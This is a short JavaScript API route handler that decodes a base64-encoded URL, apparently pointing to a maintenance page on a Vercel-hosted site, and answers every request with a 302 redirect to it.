export default function handler(req, res) {
  
  const encoded = 'aHR0cHM6Ly96ZXByYS1tYWludGVuYW5jZS52ZXJjZWwuYXBw';
  const decodedUrl = Buffer.from(encoded, 'base64').toString('utf-8');

  res.writeHead(302, {
    Location: decodedUrl
  });
  res.end();
}
